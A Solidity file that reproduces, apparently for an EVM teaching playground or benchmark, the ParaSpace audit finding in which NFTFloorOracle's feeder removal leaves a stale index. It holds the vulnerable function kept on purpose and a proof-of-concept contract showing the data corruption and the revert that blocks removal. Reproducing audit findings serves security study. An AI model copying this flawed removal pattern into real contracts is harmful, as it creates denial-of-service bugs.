// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ParaSpace - [H-01] Data corruption in NFTFloorOracle; Denial of Service
    (Code4rena 2022-11-paraspace; #25723, reporter csanuragjain)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _removeFeeder swap+pops the feeders array but does NOT update the
    moved feeder's index in feederPositionMap. Subsequent remove of the moved
    feeder OOBs / no-ops incorrectly - data corruption + removal DoS.
    Vulnerable _removeFeeder body preserved verbatim (@>). */

contract NFTFloorOracle {
    struct FeederPosition {
        bool registered;
        uint8 index;
    }

    address[] public feeders;
    mapping(address => FeederPosition) public feederPositionMap;

    function feederCount() external view returns (uint256) {
        return feeders.length;
    }

    function addFeeder(address _feeder) external {
        require(!feederPositionMap[_feeder].registered, "exists");
        feeders.push(_feeder);
        feederPositionMap[_feeder].index = uint8(feeders.length - 1);
        feederPositionMap[_feeder].registered = true;
    }

    function addFeeders(address[] calldata list) external {
        for (uint256 i = 0; i < list.length; i++) {
            address f = list[i];
            require(!feederPositionMap[f].registered, "exists");
            feeders.push(f);
            feederPositionMap[f].index = uint8(feeders.length - 1);
            feederPositionMap[f].registered = true;
        }
    }

    function removeFeeder(address _feeder) external {
        _removeFeeder(_feeder);
    }

    function _removeFeeder(address _feeder) internal {
        require(feederPositionMap[_feeder].registered, "not exist");
        uint8 feederIndex = feederPositionMap[_feeder].index;
        if (feederIndex >= 0 && feeders[feederIndex] == _feeder) {
            feeders[feederIndex] = feeders[feeders.length - 1]; // @> VULN: swap without updating moved feeder's index in map
            // FIX: feederPositionMap[feeders[feederIndex]].index = feederIndex;
            feeders.pop();
        }
        delete feederPositionMap[_feeder];
    }

    function indexOf(address f) external view returns (uint8) {
        return feederPositionMap[f].index;
    }
}

contract Exploit {
    NFTFloorOracle public oracle; // CREATE 1 - vulnerable

    address internal constant feederA = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address internal constant feederB = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    address internal constant feederC = 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;

    bool public removeCReverted;
    bool public mapCorrupted;

    constructor() {
        oracle = new NFTFloorOracle();
    }

    function run() external {
        address[] memory initialFeeders = new address[](3);
        initialFeeders[0] = feederA;
        initialFeeders[1] = feederB;
        initialFeeders[2] = feederC;
        oracle.addFeeders(initialFeeders);

        require(oracle.feederCount() == 3, "setup");
        require(oracle.indexOf(feederA) == 0, "A@0");
        require(oracle.indexOf(feederB) == 1, "B@1");
        require(oracle.indexOf(feederC) == 2, "C@2");

        // Remove middle feeder B - C is swapped into index 1, but map still says C@2.
        oracle.removeFeeder(feederB);

        require(oracle.feederCount() == 2, "after B");
        // Map for C still stores stale index 2 (was not updated after swap).
        require(oracle.indexOf(feederC) == 2, "C map not updated");
        mapCorrupted = true;

        // Try remove C - OOB access on feeders[2] when length is 2 → revert.
        (bool ok,) = address(oracle).call(
            abi.encodeWithSelector(NFTFloorOracle.removeFeeder.selector, feederC)
        );
        require(!ok, "remove C should revert OOB");
        removeCReverted = true;

        // C is stuck forever; cannot remove malfunctioning feeder.
        require(oracle.feederCount() == 2, "C still present");
        (bool reg,) = oracle.feederPositionMap(feederC);
        require(reg, "C still registered");
        require(mapCorrupted && removeCReverted, "harm not demonstrated");
    }
}
